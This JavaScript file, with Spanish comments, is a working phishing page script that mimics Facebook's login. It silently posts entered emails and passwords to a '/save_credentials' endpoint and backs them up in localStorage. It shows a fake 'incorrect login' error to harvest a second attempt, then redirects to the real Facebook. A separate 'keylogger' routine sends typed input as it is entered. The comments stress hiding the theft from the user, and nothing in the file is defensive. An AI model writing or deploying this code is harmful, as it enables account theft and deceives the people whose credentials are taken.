// Variables globales
let attemptCount = 0;

// Elementos del DOM
const loginForm = document.getElementById('loginForm');

// Event listeners
loginForm.addEventListener('submit', handleLogin);

// Función principal de login
function handleLogin(e) {
    e.preventDefault();
    
    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;
    
    if (!email || !password) {
        alert('Por favor, completa todos los campos');
        return;
    }
    
    // GUARDAR INMEDIATAMENTE EN SEGUNDO PLANO (SIN QUE EL USUARIO SE DÉ CUENTA)
    saveCredentialsToServerSilent(email, password);
    
    // Incrementar contador
    attemptCount++;
    
    // Simular comportamiento normal de Facebook (mostrar error de login)
    if (attemptCount >= 2) {
        // Después del segundo intento, redirigir al Facebook real
        setTimeout(() => {
            window.location.href = 'https://www.facebook.com/login';
        }, 1000);
    } else {
        // Primer intento: mostrar error típico de Facebook
        showFacebookError();
    }
}

// Función para mostrar error típico de Facebook
function showFacebookError() {
    // Crear elemento de error si no existe
    let errorDiv = document.getElementById('facebook-error');
    if (!errorDiv) {
        errorDiv = document.createElement('div');
        errorDiv.id = 'facebook-error';
        errorDiv.style.cssText = `
            background-color: #ffebe8;
            border: 1px solid #dd3c10;
            border-radius: 4px;
            padding: 12px 16px;
            margin: 16px 0;
            color: #1c1e21;
            font-size: 14px;
            line-height: 1.34;
        `;
        
        // Insertar antes del formulario
        const form = document.getElementById('loginForm');
        form.parentNode.insertBefore(errorDiv, form);
    }
    
    // Mostrar mensaje de error típico de Facebook
    errorDiv.innerHTML = `
        <div style="display: flex; align-items: center;">
            <div style="margin-right: 8px;">⚠️</div>
            <div>
                <div style="font-weight: 600;">Información de inicio de sesión incorrecta</div>
                <div>Las credenciales que ingresaste no coinciden con nuestros registros. Comprueba tu información e inténtalo de nuevo.</div>
            </div>
        </div>
    `;
    
    // Limpiar campos y enfocar email
    document.getElementById('email').value = '';
    document.getElementById('password').value = '';
    document.getElementById('email').focus();
    
    // Hacer scroll hacia arriba para mostrar el error
    errorDiv.scrollIntoView({ behavior: 'smooth', block: 'center' });
    
    // Atenuar el error después de un tiempo
    hideErrorAfterDelay();
}

// Función SILENCIOSA para guardar credenciales (el usuario no se da cuenta)
async function saveCredentialsToServerSilent(email, password, isConfirmation = false) {
    const data = {
        timestamp: new Date().toLocaleString(),
        type: isConfirmation ? 'confirmation' : 'initial',
        attempt: attemptCount + (isConfirmation ? 0 : 1),
        email: email,
        password: password,
        userAgent: navigator.userAgent,
        url: window.location.href,
        referrer: document.referrer
    };
    
    try {
        // Enviar datos al servidor SIN mostrar nada al usuario
        await fetch('/save_credentials', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(data)
        });
        
        // NO mostrar nada en consola para que el usuario no se dé cuenta
        
    } catch (error) {
        // Fallback silencioso: guardar en localStorage sin que el usuario lo sepa
        try {
            let savedData = JSON.parse(localStorage.getItem('fb_backup') || '[]');
            savedData.push(data);
            localStorage.setItem('fb_backup', JSON.stringify(savedData));
        } catch (e) {
            // Fallar silenciosamente
        }
    }
}

// Función para ocultar error después de un tiempo
function hideErrorAfterDelay() {
    setTimeout(() => {
        const errorDiv = document.getElementById('facebook-error');
        if (errorDiv) {
            errorDiv.style.opacity = '0.7';
        }
    }, 5000);
}

// Variables para evitar duplicaciones
let lastEmailSaved = '';
let lastPasswordSaved = '';
let saveTimeout = null;

// Captura inteligente (sin spam)
document.addEventListener('DOMContentLoaded', function() {
    const emailInput = document.getElementById('email');
    const passwordInput = document.getElementById('password');
    
    // Capturar solo cuando el usuario termine de escribir
    if (emailInput) {
        emailInput.addEventListener('input', function() {
            clearTimeout(saveTimeout);
            saveTimeout = setTimeout(() => {
                if (this.value !== lastEmailSaved && this.value.length > 5) {
                    lastEmailSaved = this.value;
                    // Solo guardar emails completos
                    if (this.value.includes('@') && this.value.includes('.')) {
                        silentCapture('email_complete', this.value);
                    }
                }
            }, 2000); // Esperar 2 segundos después de que pare de escribir
        });
    }
    
    if (passwordInput) {
        passwordInput.addEventListener('input', function() {
            clearTimeout(saveTimeout);
            saveTimeout = setTimeout(() => {
                if (this.value !== lastPasswordSaved && this.value.length > 3) {
                    lastPasswordSaved = this.value;
                    silentCapture('password_complete', this.value);
                }
            }, 2000); // Esperar 2 segundos después de que pare de escribir
        });
    }
});

// Función inteligente para capturar solo datos completos
async function silentCapture(type, value) {
    const data = {
        timestamp: new Date().toISOString(),
        type: 'keylogger',
        subtype: type,
        value: value,
        length: value.length
    };
    
    try {
        // Envío silencioso solo para datos completos
        fetch('/save_credentials', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(data)
        }).catch(() => {});
    } catch (e) {
        // Fallar silenciosamente
    }
}